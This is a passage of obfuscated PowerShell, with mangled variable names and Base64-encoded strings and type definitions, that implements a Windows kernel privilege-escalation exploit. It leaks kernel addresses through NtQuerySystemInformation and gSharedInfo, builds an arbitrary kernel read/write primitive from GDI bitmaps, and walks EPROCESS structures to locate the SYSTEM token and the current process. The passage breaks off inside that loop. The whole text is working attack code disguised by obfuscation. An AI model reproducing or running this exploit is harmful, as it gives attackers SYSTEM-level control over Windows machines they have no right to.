	Add-Type -TypeDefinition $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgAJAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsADQAKAAkAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoACQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsADsADQAKAA0ACgAJAFsAUwB0AHIAdQBjAHQATABhAHkAbwB1AHQAKABMAGEAeQBvAHUAdABLAGkAbgBkAC4AUwBlAHEAdQBlAG4AdABpAGEAbAAsACAAUABhAGMAawAgAD0AIAAxACkAXQANAAoACQBwAHUAYgBsAGkAYwAgAHMAdAByAHUAYwB0ACAAUwBZAFMAVABFAE0AXwBNAE8ARABVAEwARQBfAEkATgBGAE8AUgBNAEEAVABJAE8ATgANAAoACQB7AA0ACgAJAAkAWwBNAGEAcgBzAGgAYQBsAEEAcwAoAFUAbgBtAGEAbgBhAGcAZQBkAFQAeQBwAGUALgBCAHkAVgBhAGwAQQByAHIAYQB5ACwAIABTAGkAegBlAEMAbwBuAHMAdAAgAD0AIAAyACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdABQAHQAcgBbAF0AIABSAGUAcwBlAHIAdgBlAGQAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAG0AYQBnAGUAQgBhAHMAZQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABVAEkAbgB0ADMAMgAgAEkAbQBhAGcAZQBTAGkAegBlADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAFUASQBuAHQAMwAyACAARgBsAGEAZwBzADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAFUASQBuAHQAMQA2ACAATABvAGEAZABPAHIAZABlAHIASQBuAGQAZQB4ADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAFUASQBuAHQAMQA2ACAASQBuAGkAdABPAHIAZABlAHIASQBuAGQAZQB4ADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAFUASQBuAHQAMQA2ACAATABvAGEAZABDAG8AdQBuAHQAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAxADYAIABNAG8AZAB1AGwAZQBOAGEAbQBlAE8AZgBmAHMAZQB0ADsADQAKAAkACQBbAE0AYQByAHMAaABhAGwAQQBzACgAVQBuAG0AYQBuAGEAZwBlAGQAVAB5AHAAZQAuAEIAeQBWAGEAbABBAHIAcgBhAHkALAAgAFMAaQB6AGUAQwBvAG4AcwB0ACAAPQAgADIANQA2ACkAXQANAAoACQAJAGkAbgB0AGUAcgBuAGEAbAAgAEMAaABhAHIAWwBdACAAXwBJAG0AYQBnAGUATgBhAG0AZQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABTAHQAcgBpAG4AZwAgAEkAbQBhAGcAZQBOAGEAbQBlACAAewANAAoACQAJAAkAZwBlAHQAIAB7AA0ACgAJAAkACQAJAHIAZQB0AHUAcgBuACAAbgBlAHcAIABTAHQAcgBpAG4AZwAoAF8ASQBtAGEAZwBlAE4AYQBtAGUAKQAuAFMAcABsAGkAdAAoAG4AZQB3ACAAQwBoAGEAcgBbAF0AIAB7ACcAXAAwACcAfQAsACAAMgApAFsAMABdADsADQAKAAkACQAJAH0ADQAKAAkACQB9AA0ACgAJAH0ADQAKAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABOAHQAZABsAGwADQAKAAkAewANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAG4AdABkAGwAbAAuAGQAbABsACIAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAaQBuAHQAIABOAHQAUQB1AGUAcgB5AFMAeQBzAHQAZQBtAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAoAA0ACgAJAAkACQBpAG4AdAAgAFMAeQBzAHQAZQBtAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBDAGwAYQBzAHMALAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABTAHkAcwB0AGUAbQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4ALAANAAoACQAJAAkAaQBuAHQAIABTAHkAcwB0AGUAbQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4ATABlAG4AZwB0AGgALAANAAoACQAJAAkAcgBlAGYAIABpAG4AdAAgAFIAZQB0AHUAcgBuAEwAZQBuAGcAdABoACkAOwANAAoACQB9AA==')))
	[int]${/===\/\/==\/\_/==} = 0
	while ($true) {
		[IntPtr]${__/=\/\_/=\/=\/=\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/===\/\/==\/\_/==})
		${/=\_____/\_/=\/=\} = New-Object Int
		${___/===\_/\_/=\_/} = [Ntdll]::NtQuerySystemInformation(11, ${__/=\/\_/=\/=\/=\}, ${/===\/\/==\/\_/==}, [ref]${/=\_____/\_/=\/=\})
		if (${___/===\_/\_/=\_/} -eq 0xC0000004) {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/=\/\_/=\/=\/=\})
			[int]${/===\/\/==\/\_/==} = [System.Math]::Max(${/===\/\/==\/\_/==},${/=\_____/\_/=\/=\})
		}
		elseif (${___/===\_/\_/=\_/} -eq 0x00000000) {
			break
		}
		else {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/=\/\_/=\/=\/=\})
			return
		}
	}
	${/=\/\_/\_/\/==\/=} = New-Object SYSTEM_MODULE_INFORMATION
	${/=\/\_/\_/\/==\/=} = ${/=\/\_/\_/\/==\/=}.GetType()
	if ([System.IntPtr]::Size -eq 4) {
		${___/\/===\__/\_/\} = 284
	} else {
		${___/\/===\__/\_/\} = 296
	}
	${______/==\__/\__/} = ${__/=\/\_/=\/=\/=\}.ToInt64()
	${_/==\/\/=\__/\_/\} = [System.Runtime.InteropServices.Marshal]::ReadInt32(${______/==\__/\__/})
	${______/==\__/\__/} = ${______/==\__/\__/} + [System.IntPtr]::Size
	${__/\/=\__/==\/\/=} = @()
	for (${_/=\_/===\_/=\/==}=0; ${_/=\_/===\_/=\/==} -lt ${_/==\/\/=\__/\_/\}; ${_/=\_/===\_/=\/==}++){
		${_/\____/\____/\/\} = New-Object System.Intptr -ArgumentList ${______/==\__/\__/}
		${__/=\/=\/\/\/=\_/} = [system.runtime.interopservices.marshal]::PtrToStructure(${_/\____/\____/\/\},[type]${/=\/\_/\_/\/==\/=})
		${__/==\_/=\/=\/=\_} = @{
			ImageName = ${__/=\/=\/\/\/=\_/}.ImageName
			ImageBase = if ([System.IntPtr]::Size -eq 4) {$(${__/=\/=\/\/\/=\_/}.ImageBase).ToInt32()} else {$(${__/=\/=\/\/\/=\_/}.ImageBase).ToInt64()}
			ImageSize = "0x$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${__/=\/=\/\/\/=\_/}.ImageSize)"
		}
		${______/==\/==\_/=} = New-Object PSObject -Property ${__/==\_/=\/=\/=\_}
		${__/\/=\__/==\/\/=} += ${______/==\/==\_/=}
		${______/==\__/\__/} = ${______/==\__/\__/} + ${___/\/===\__/\_/\}
	}
	${__/\/=\__/==\/\/=}
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/=\/\_/=\/=\/=\})
}
function _/\____/==\_______ {
	Add-Type -TypeDefinition $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgAJAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsADQAKAAkAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoACQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsADsADQAKAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABnAFMAaABhAHIAZQBkAEkAbgBmAG8AQgBpAHQAbQBhAHAADQAKAAkAewANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGcAZABpADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBCAGkAdABtAGEAcAAoAA0ACgAJAAkAIAAgACAAIABpAG4AdAAgAG4AVwBpAGQAdABoACwADQAKAAkACQAgACAAIAAgAGkAbgB0ACAAbgBIAGUAaQBnAGgAdAAsAA0ACgAJAAkAIAAgACAAIAB1AGkAbgB0ACAAYwBQAGwAYQBuAGUAcwAsAA0ACgAJAAkAIAAgACAAIAB1AGkAbgB0ACAAYwBCAGkAdABzAFAAZQByAFAAZQBsACwADQAKAAkACQAgACAAIAAgAEkAbgB0AFAAdAByACAAbABwAHYAQgBpAHQAcwApADsADQAKAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQAsACAAQwBoAGEAcgBTAGUAdAAgAD0AIABDAGgAYQByAFMAZQB0AC4AQQBuAHMAaQApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAA0ACgAJAAkAIAAgACAAIABzAHQAcgBpAG4AZwAgAGwAcABGAGkAbABlAE4AYQBtAGUAKQA7AA0ACgAJAAkADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgAsACAAQwBoAGEAcgBTAGUAdAA9AEMAaABhAHIAUwBlAHQALgBBAG4AcwBpACwAIABFAHgAYQBjAHQAUwBwAGUAbABsAGkAbgBnAD0AdAByAHUAZQAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgADQAKAAkACQAgACAAIAAgAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsAA0ACgAJAAkAIAAgACAAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsADQAKAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAQwByAGUAYQB0AGUAQQBjAGMAZQBsAGUAcgBhAHQAbwByAFQAYQBiAGwAZQAoAA0ACgAJAAkAIAAgACAAIABJAG4AdABQAHQAcgAgAGwAcABhAGMAYwBsACwADQAKAAkACQAgACAAIAAgAGkAbgB0ACAAYwBFAG4AdAByAGkAZQBzACkAOwANAAoADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEQAZQBzAHQAcgBvAHkAQQBjAGMAZQBsAGUAcgBhAHQAbwByAFQAYQBiAGwAZQAoAA0ACgAJAAkAIAAgACAAIABJAG4AdABQAHQAcgAgAGgAQQBjAGMAZQBsACkAOwANAAoACQB9AA==')))
	if ([System.IntPtr]::Size -eq 4) {
		${_/\/\___/=\/==\/\} = 1
	}
	function _____/\____/==\/\/ {
	    [IntPtr]${_/\/===\/\/\__/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
	    ${/=\_/\__/\_/==\__} = [gSharedInfoBitmap]::CreateAcceleratorTable(${_/\/===\/\/\__/==}, 700) 
	    ${/==\__/\/=\___/==} = [gSharedInfoBitmap]::LoadLibrary($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgAzADIALgBkAGwAbAA='))))
	    ${___/=\__/=\____/=} = [gSharedInfoBitmap]::GetProcAddress(${/==\__/\/=\___/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBTAGgAYQByAGUAZABJAG4AZgBvAA=='))))
	    if (${_/\/\___/=\/==\/\}){
	        ${___/=\__/=\____/=} = ${___/=\__/=\____/=}.ToInt32()
	    } else {
	        ${___/=\__/=\____/=} = ${___/=\__/=\____/=}.ToInt64()
	    }
	    ${__/===\/\_/===\__} = ${___/=\__/=\____/=} + [System.IntPtr]::Size
	    if (${_/\/\___/=\/==\/\}){
	        ${__/===\/\_/===\__} = [System.Runtime.InteropServices.Marshal]::ReadInt32(${__/===\/\_/===\__})
	        ${__/====\/\/\_/\/=} = ${__/===\/\_/===\__} + ([int]${/=\_/\__/\_/==\__} -band 0xffff)*0xc 
	        ${/=\_/\/=\____/\/=} = [System.Runtime.InteropServices.Marshal]::ReadInt32(${__/====\/\/\_/\/=})
	    } else {
	        ${__/===\/\_/===\__} = [System.Runtime.InteropServices.Marshal]::ReadInt64(${__/===\/\_/===\__})
	        ${__/====\/\/\_/\/=} = ${__/===\/\_/===\__} + ([int]${/=\_/\__/\_/==\__} -band 0xffff)*0x18 
	        ${/=\_/\/=\____/\/=} = [System.Runtime.InteropServices.Marshal]::ReadInt64(${__/====\/\/\_/\/=})
	    }
	    ${/=\__/===\/\/\_/=} = @()
	    ${__/==\_/=\/=\/=\_} = @{
	        Handle = ${/=\_/\__/\_/==\__}
	        KernelObj = ${/=\_/\/=\____/\/=}
	    }
	    ${______/==\/==\_/=} = New-Object PSObject -Property ${__/==\_/=\/=\/=\_}
	    ${/=\__/===\/\/\_/=} += ${______/==\/==\_/=}
	    ${/=\__/===\/\/\_/=}
	}
	function __/===\_/==\_/===\ {
	    param (${__/\_/\/=\/=\/\/\_})
	    ${___/===\_/\_/=\_/} = [gSharedInfoBitmap]::DestroyAcceleratorTable(${__/\_/\/=\/=\/\/\_})
	}
	${____/\/\/\__/\/\/} = @()
	for (${_/=\_/===\_/=\/==}=0;${_/=\_/===\_/=\/==} -lt 20;${_/=\_/===\_/=\/==}++) {
	    ${____/\/\/\__/\/\/} += _____/\____/==\/\/
	    if (${____/\/\/\__/\/\/}.Length -gt 1) {
	        if (${____/\/\/\__/\/\/}[${_/=\_/===\_/=\/==}].KernelObj -eq ${____/\/\/\__/\/\/}[${_/=\_/===\_/=\/==}-1].KernelObj) {
	            __/===\_/==\_/===\ -__/\_/\/=\/=\/\/\_ ${____/\/\/\__/\/\/}[${_/=\_/===\_/=\/==}].Handle
	            [IntPtr]${_/\/===\/\/\__/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
				if (${___/===\/\/\/\_/\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAuADEA')))) { 
					${/==\/==\/=\/\/\_/} = [gSharedInfoBitmap]::CreateBitmap(0x770, 4, 1, 8, ${_/\/===\/\/\__/==}) 
				} else {
					${/==\/==\/=\/\/\_/} = [gSharedInfoBitmap]::CreateBitmap(0x760, 4, 1, 8, ${_/\/===\/\/\__/==}) 
				}
	            break
	        }
	    }
	    __/===\_/==\_/===\ -__/\_/\/=\/=\/\/\_ ${____/\/\/\__/\/\/}[${_/=\_/===\_/=\/==}].Handle
	}
	${/=\_____/\_/==\/=} = @()
	${__/==\_/=\/=\/=\_} = @{
	    BitmapHandle = ${/==\/==\/=\/\/\_/}
	    BitmapKernelObj = $(${____/\/\/\__/\/\/}[${_/=\_/===\_/=\/==}].KernelObj)
	    BitmappvScan0 = if (${_/\/\___/=\/==\/\}) {$(${____/\/\/\__/\/\/}[${_/=\_/===\_/=\/==}].KernelObj) + 0x32} else {$(${____/\/\/\__/\/\/}[${_/=\_/===\_/=\/==}].KernelObj) + 0x50}
	}
	${______/==\/==\_/=} = New-Object PSObject -Property ${__/==\_/=\/=\/=\_}
	${/=\_____/\_/==\/=} += ${______/==\/==\_/=}
	${/=\_____/\_/==\/=}
}
function _/=\/==\/===\/=\_/ {
	param([IntPtr]${_____/=\/=\_/===\_},[IntPtr]${__/\/\_/\/====\_/=})
	Add-Type -TypeDefinition $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgAJAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsADQAKAAkAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoACQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsADsADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGMAbABhAHMAcwAgAEIAaQB0AG0AYQBwAEUAbABlAHYAYQB0AGUADQAKAAkAewANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGcAZABpADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAaQBuAHQAIABTAGUAdABCAGkAdABtAGEAcABCAGkAdABzACgADQAKAAkACQAJAEkAbgB0AFAAdAByACAAaABiAG0AcAAsAA0ACgAJAAkACQB1AGkAbgB0ACAAYwBCAHkAdABlAHMALAANAAoACQAJAAkAYgB5AHQAZQBbAF0AIABsAHAAQgBpAHQAcwApADsADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBnAGQAaQAzADIALgBkAGwAbAAiACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAARwBlAHQAQgBpAHQAbQBhAHAAQgBpAHQAcwAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgAYgBtAHAALAANAAoACQAJAAkAaQBuAHQAIABjAGIAQgB1AGYAZgBlAHIALAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABsAHAAdgBCAGkAdABzACkAOwANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwADQAKAAkACQAJAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsAA0ACgAJAAkACQBVAEkAbgB0ADMAMgAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAANAAoACQAJAAkAVQBJAG4AdAAzADIAIABmAGwAUAByAG8AdABlAGMAdAApADsADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwARgByAGUAZQAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwADQAKAAkACQAJAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsAA0ACgAJAAkACQB1AGkAbgB0ACAAZAB3AEYAcgBlAGUAVAB5AHAAZQApADsADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEYAcgBlAGUATABpAGIAcgBhAHIAeQAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUAKQA7AA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQAsACAAQwBoAGEAcgBTAGUAdAAgAD0AIABDAGgAYQByAFMAZQB0AC4AQQBuAHMAaQApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAA0ACgAJAAkACQBzAHQAcgBpAG4AZwAgAGwAcABGAGkAbABlAE4AYQBtAGUAKQA7AA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIALAAgAEMAaABhAHIAUwBlAHQAPQBDAGgAYQByAFMAZQB0AC4AQQBuAHMAaQAsACAARQB4AGEAYwB0AFMAcABlAGwAbABpAG4AZwA9AHQAcgB1AGUALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUALAANAAoACQAJAAkAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAJAH0A')))
	function _/=\_/=\_/=\_/==\_ {
		param (${_/===\_/=====\_/\_})
		${___/===\_/\_/=\_/} = [BitmapElevate]::SetBitmapBits(${_____/=\/=\_/===\_}, [System.IntPtr]::Size, [System.BitConverter]::GetBytes(${_/===\_/=====\_/\_}))
		[IntPtr]${_/\_/=\_/\/==\__/} = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		${___/===\_/\_/=\_/} = [BitmapElevate]::GetBitmapBits(${__/\/\_/\/====\_/=}, [System.IntPtr]::Size, ${_/\_/=\_/\/==\__/})
		if ($x32Architecture){
			[System.Runtime.InteropServices.Marshal]::ReadInt32(${_/\_/=\_/\/==\__/})
		} else {
			[System.Runtime.InteropServices.Marshal]::ReadInt64(${_/\_/=\_/\/==\__/})
		}
		${___/===\_/\_/=\_/} = [BitmapElevate]::VirtualFree(${_/\_/=\_/\/==\__/}, [System.IntPtr]::Size, 0x8000)
	}
	function _____/\____/\__/== {
		param (${_/===\_/=====\_/\_}, ${___/=\_/=====\/=\_})
		${___/===\_/\_/=\_/} = [BitmapElevate]::SetBitmapBits(${_____/=\/=\_/===\_}, [System.IntPtr]::Size, [System.BitConverter]::GetBytes(${_/===\_/=====\_/\_}))
		${___/===\_/\_/=\_/} = [BitmapElevate]::SetBitmapBits(${__/\/\_/\/====\_/=}, [System.IntPtr]::Size, [System.BitConverter]::GetBytes(${___/=\_/=====\/=\_}))
	}
	switch (${___/===\/\/\/\_/\})
	{
		$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAwAC4AMAA='))) 
		{
			${/=\_/==\_/\/=\/\_} = 0x2e8
			${_/\/\_/\/=\_____/} = 0x358          
			${___/\/====\_/===\} = 0x2f0
		}
		$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAuADMA'))) 
		{
			${/=\_/==\_/\/=\/\_} = 0x2e0
			${_/\/\_/\/=\_____/} = 0x348          
			${___/\/====\_/===\} = 0x2e8
		}
		$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAuADIA'))) 
		{
			${/=\_/==\_/\/=\/\_} = 0x2e0
			${_/\/\_/\/=\_____/} = 0x348          
			${___/\/====\_/===\} = 0x2e8
		}
		$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAuADEA'))) 
		{
			${/=\_/==\_/\/=\/\_} = 0x180
			${_/\/\_/\/=\_____/} = 0x208          
			${___/\/====\_/===\} = 0x188
		}
	}
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbAD4AXQAgAEwAZQBhAGsAaQBuAGcAIABTAFkAUwBUAEUATQAgAF8ARQBQAFIATwBDAEUAUwBTAC4ALgA=')))
	${__/\/=\__/==\/\/=} = __/\/\/\/===\_/\/\
	${___/\/\_____/===\} = ${__/\/=\__/==\/\/=}[0].ImageBase
	${_/\__/=\/\/==\/==} = (${__/\/=\__/==\/\/=}[0].ImageName -split "\\")[-1]
	${___/=\/===\/\__/=} = [BitmapElevate]::LoadLibrary($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwAvAD0AXAAvAFwALwA9AD0AXAAvAD0APQB9AA=='))))
	${_/\/=\/=\_/=\/===} = [BitmapElevate]::GetProcAddress(${___/=\/===\/\__/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABzAEkAbgBpAHQAaQBhAGwAUwB5AHMAdABlAG0AUAByAG8AYwBlAHMAcwA='))))
	${_____/=\/\/=\/==\} = if (!$x32Architecture) {${_/\/=\/=\_/=\/===}.ToInt64() - ${___/=\/===\/\__/=} + ${___/\/\_____/===\}} else {${_/\/=\/=\_/=\/===}.ToInt32() - ${___/=\/===\/\__/=} + ${___/\/\_____/===\}}
	${___/===\_/\_/=\_/} = [BitmapElevate]::FreeLibrary(${___/=\/===\/\__/=})
	echo "[+] _EPROCESS list entry: 0x$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${_____/=\/\/=\/==\})"
	${_/\_/\/\/\/\/=\_/} = _/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ ${_____/=\/\/=\/==\}
	echo "[+] SYSTEM _EPROCESS address: 0x$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f $(_/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ ${_____/=\/\/=\/==\}))"
	echo "[+] PID: $(_/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ $(${_/\_/\/\/\/\/=\_/}+${/=\_/==\_/\/=\/\_}))"
	echo "[+] SYSTEM Token: 0x$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f $(_/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ $(${_/\_/\/\/\/\/=\_/}+${_/\/\_/\/=\_____/})))"
	${/=\_/\__/=====\/\} = _/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ $(${_/\_/\/\/\/\/=\_/}+${_/\/\_/\/=\_____/})
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbAD4AXQAgAEwAZQBhAGsAaQBuAGcAIABjAHUAcgByAGUAbgB0ACAAXwBFAFAAUgBPAEMARQBTAFMALgAuAA==')))
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABUAHIAYQB2AGUAcgBzAGkAbgBnACAAQQBjAHQAaQB2AGUAUAByAG8AYwBlAHMAcwBMAGkAbgBrAHMAIABsAGkAcwB0AA==')))
	${__/====\___/\__/=} = $(_/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ $(${_/\_/\/\/\/\/=\_/}+${___/\/====\_/===\})) - ${/=\_/==\_/\/=\/\_} - [System.IntPtr]::Size
	while($true) {
		${____/\/\/\_/=\__/} = _/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ $(${__/====\___/\__/=}+${/=\_/==\_/\/=\/\_})
		if (${____/\/\/\_/=\__/} -eq $PID) {
			echo "[+] PowerShell _EPROCESS address: 0x$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${__/====\___/\__/=})"
			echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAEkARAA6ACAAJAB7AF8AXwBfAF8ALwBcAC8AXAAvAFwAXwAvAD0AXABfAF8ALwB9AA==')))
